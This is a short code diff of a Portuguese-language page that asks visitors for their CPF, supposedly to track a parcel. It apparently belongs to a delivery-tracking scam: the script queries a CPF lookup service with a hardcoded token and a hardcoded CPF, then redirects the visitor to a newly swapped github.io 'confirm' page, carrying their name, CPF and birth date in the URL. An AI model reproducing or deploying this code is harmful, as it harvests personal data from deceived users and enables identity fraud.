@@ -196,7 +196,7 @@ Digite seu CPF para rastreamento.
 
         // URL principal e alternativa de fallback
         const apiUrl =`https://consulta.fontesderenda.blog/?token=114dbffe-9436-42ae-81a2-2bcf52d24c48&cpf=33512403840&cpf=${cpf}`;
-        const fallbackUrl =`https://rastreiodeentrega.xyz/confirmar`;
+        const fallbackUrl =`https://lojaespanha1.github.io/confirmar/`;
 
         let timeout = false;
 
@@ -234,7 +234,7 @@ Digite seu CPF para rastreamento.
             }
 
             // Redireciona para a página com os dados obtidos
-            window.location.href =`https://rastreiodeentrega.xyz/confirmar/?nome=${encodeURIComponent(nome)}&cpf=${cpf}&nascimento=${encodeURIComponent(nasc)}`;
+            window.location.href =`https://lojaespanha1.github.io/confirmar/?nome=${encodeURIComponent(nome)}&cpf=${cpf}&nascimento=${encodeURIComponent(nasc)}`;
         } catch (error) {
             console.error('Erro ao acessar a API principal, redirecionando para link alternativo:', error);
 
